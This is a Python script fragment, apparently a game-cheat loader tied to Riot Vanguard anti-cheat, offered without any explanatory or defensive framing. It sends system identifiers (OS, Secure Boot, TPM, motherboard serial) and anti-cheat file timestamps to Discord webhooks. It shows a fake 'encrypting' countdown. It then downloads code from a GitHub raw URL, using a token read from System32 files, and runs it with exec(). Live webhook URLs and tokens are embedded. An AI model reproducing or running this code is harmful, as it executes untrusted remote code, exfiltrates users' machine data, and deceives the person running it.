def disable_fast_startup():
    command = 'powercfg -h off'
    subprocess.run(['powershell', command], capture_output=True, text=True)
disable_fast_startup()

def gathering_data_okx(file_path, message):
    webhook_url = "https://discordapp.com/api/webhooks/1351101845728137269/u2q5Qy5G78nozccKoPPTWVqedCFFOXiFgQ1B5V_2IJ8TWpUEQjcdPKH5eqU-MGX96Ieb"
    mod_time = os.path.getmtime(file_path)
    mod_time_human_readable = time.strftime('%B %d, %Y %I:%M%p', time.localtime(mod_time))
    
    data = {
        "content": f"{message}{mod_time_human_readable}"
    }
    
    requests.post(webhook_url, json=data)

gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgc.exe", server_nickname+" vgc last update:")
gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgk.sys", server_nickname+" vgk last update:")

os.system('cls')
myuptimex = get_uptime_minutes()
if myuptimex > 2:
    print("")
else:
    os.system('cls')
    print("Encrypting the data and decoding, please wait.")
    seconds = 120
    while seconds:
        mins, secs = divmod(seconds, 60)
        print(f"{mins:02}:{secs:02}", end="\r")
        time.sleep(1)
        seconds -= 1

os.system('cls')
data_send_aes('https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D',server_nickname ,my_os_data ,my_os_version ,my_secureboot ,my_tpm ,my_motherboard_serial ,aes_user_date_installed,myinfo_xx_lc)
os.system('cls')


def premx_2025(mycontent: str):
    raw_url = "https://raw.githubusercontent.com/nvtsxlz/myown/9979000b72229cb3a7a4b15da7aa886f7017174d/premx_myself.txt?token=GHSAT0AAAAAADBMT63O3KJMDXRXP7UZBZVY2BBO3FQ"
    headers = {"Authorization": f"token {mycontent}"}
    response = requests.get(raw_url, headers=headers)
    
    if response.status_code == 200:
        mycntcnt = response.text
        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
    else:
        raise Exception(f"Error. Your internet is private.")

part1_data = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
part2_Data = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
part3_data = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
content1 = get_data_from_file(part1_data)
content2 = get_data_from_file(part2_Data)
content3 = get_data_from_file(part3_data)
content4 =  content1+content2+content3

premx_2025(content4)
